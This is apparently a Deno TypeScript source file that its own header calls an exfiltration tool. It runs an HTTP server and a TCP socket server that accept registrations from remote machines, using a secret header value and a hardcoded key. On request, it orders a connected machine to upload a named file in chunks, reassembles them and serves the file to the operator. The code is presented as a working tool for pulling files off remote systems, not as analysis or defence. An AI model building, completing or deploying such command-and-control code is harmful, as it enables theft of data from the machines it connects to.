/**
 * This program is the exfiltration tool for the distant server.
 * You need to launch the distant server before the main.ts
 */
import { start } from "./utils/start.ts";
new start();

console.log('~~ Exfiltraton server started')

import { serve, Response } from "https://deno.land/std@0.104.0/http/server.ts";
import { Client, Event, Packet, Server } from "https://deno.land/x/tcp_socket@0.0.2/mods.ts";
import { upload } from "./upload.ts";
const server = serve({ port: 16333 });
const server_socket = new Server({ port: 16334 });
const _upload = new upload()

let serverDB = []
let socketAuth = []
// =========================== MAIN ===========================


async function main(request) {
    let response:Response = {}

    //NOW let's play with the routes
    
    ///check if client / server side
    let isClientOrServer = clientOrServer(request)

    if(isClientOrServer === 'server'){
        response = await SERVER_SIDE_controler(request)
    } else if(isClientOrServer === 'client'){
        response = await CLIENT_SIDE_controler(request)
    } else {
        response.status = 418
    }

    request.respond(response);
}

async function SERVER_SIDE_controler(request){
    let response:Response = {}

    if(request.method == "POST"){
        try{
            let body = await getRequestBody(request)
            if(request.url === "/auth"){
                // this is a new server, we need to launch the AUTH service
                // generate a new AuthKey
                let authKey = "1234"
    
                serverDB.push({
                    name: body.name,
                    key: body.key,
                    authKey: authKey,
                    addInfo: {},
                    aes: body.aes
                })
                let socketAUTH = {
                    authKey: authKey,
                    AES: "none",
                }
                socketAuth.push(socketAUTH)
                //respond to him with his WEBSOCKET auth
                response.body = JSON.stringify(socketAUTH)
            } 
        } catch(err){}
    } else {
        response.status = 418
    }

    return response
}

async function CLIENT_SIDE_controler(request){
    let response:Response = {}

    if(request.method == "GET"){
        if(request.url === "/"){
            // list all file of dir :${KEY}
            response.body = "wow"
        } else if(request.url.startsWith("/list:")){
            // list all file of dir :${KEY}
        } else if(request.url.startsWith("/get:")){
            // get file :${KEY}
            let fileNAME = request.url.split(":")[1]
            response.body = await waitingFileContent(fileNAME)
        }
    }


    return response
}


//utils function

async function getRequestBody(request) {
    let body = await Deno.readAll(request.body);
    return JSON.parse(new TextDecoder().decode(body));
}

function clientOrServer(request){
    //check if header ir-server is set to HIBVUIK
    try{
        if(request.headers.get('ir-server') === 'HIBVUIK'){
            return 'server'
        }
    } catch(err){}
    return 'client'
}



async function waitingFileContent(FILENAME) {
    getFile(FILENAME)
    return new Promise(async (resolve) => {
        let int = setInterval(async () => {
            let file = _upload.FILEDB.filter(x => x.name == FILENAME)
            if(file.length >0) {
                //parcour all the possible file
                for(let i = 0; i < file.length; i++){
                    if(file[i].content == "ok"){
                        //change all value for number
                        _upload.FILEDB = _upload.FILEDB.filter(x => x.name != FILENAME)
                        clearInterval(int)
                        if(file[i].socket){
                            resolve(new Uint8Array(file[i].packet.split(",").map(x => parseInt(x))))
                        } else {
                            resolve(file[i].buffer)
                        }
                    }
                }
            }
        }, 50)
    })
}

async function getFile(FILENAME) {
    server_socket.clients[0].write(JSON.stringify({
        url: '/file',
        name: FILENAME
    }))
}


// =========================== SOCKET ===========================

// Server listen
server_socket.on(Event.listen, (server: Deno.Listener) => {
    let addr = server.addr as Deno.NetAddr;
    console.log(`~ [SOCKET] - Server listen ${addr.hostname}:${addr.port}`);
});
  
// Client connect
server_socket.on(Event.connect, (client: Client) => {
    console.log("~ [SOCKET] - New Client");
});
  
// Client close
server_socket.on(Event.close, (client: Client) => {
    console.log("~ [SOCKET] - Client close -");
});
  
// Server finish
server_socket.on(Event.shutdown, () => {
    console.log("~ [SOCKET] - Server is shutdown");
});
  
// Handle error
server_socket.on(Event.error, (e) => {
    console.error(e);
});
  

server_socket.on(Event.receive, async (client: Client, data: Packet, length: number) => {
    try{
        data = JSON.parse(data.toString())
        //faire la auth du client socket
        if(data.url === "/auth"){
            if(client.auth == undefined || !client.auth) {
                console.log('~ [SOCKET] - client ask to auth')
                client.authKey = data.authKey  // ERROR HERE
                client.write(JSON.stringify({'ok': true}))
            }
        } else if(data.url == "/done"){
            console.log('~ [SOCKET] - Done - file transfer via socket')
            client.sendingFile = false
            //order packet by i
            let file = _upload.FILEDB.filter(x => x.name == data.name)
            let packet = file[0].packet.sort((a, b) => a.i - b.i)
            //only keep the value
            packet = packet.map(x => x.value)
            packet = packet.join("")
            file[0].packet = packet
            file[0].content = "ok"
        } else if(data.url == "/upload"){
            let file = _upload.FILEDB.filter(x => x.name == data.name)
            file[0].packet.push(data)
        } else if(data.url == "/send"){
            console.log('~ [SOCKET] - File transfer ask')
            client.sendingFile = true
            _upload.FILEDB.push({
                socket: true,
                name: data.name,
                packet: [],
                content: ""
            })
            client.write(JSON.stringify({'url': "/send", "path": data.name}))
        }
    } catch(err){
        let dataREQ = data.toString()
        if(dataREQ.startsWith('{"url":"/upload"')){
            let tmp = {
                url: "/upload",
                name: dataREQ.split('"name":"')[1].split('"')[0],
                i: Number(dataREQ.split('"i":')[1].split(',')[0]),
                value: dataREQ.split('"value":"')[1].split('"')[0]
            }
            let file = _upload.FILEDB.filter(x => x.name == tmp.name)
            file[0].packet.push(tmp)
        } else {
            console.log(err)
        }
    }
})

async function launchServerSocket() {
    await server_socket.listen();
}
launchServerSocket()

async function sleep(time){
    return new Promise((resolve) => {
        setTimeout(() => {
            resolve(true)
        }, time*1000)
    })
}

// ======================= LAUNCH THE SERVER =======================

// new interval
setInterval(() => {
    //console.table(serverDB)
}, 5000)


//Launch
_upload.main()
for await (const request of server) {
    if(["GET", "POST"].includes(request.method)){
        main(request)
    } else {
        request.respond({ status: 418 })
    }
}
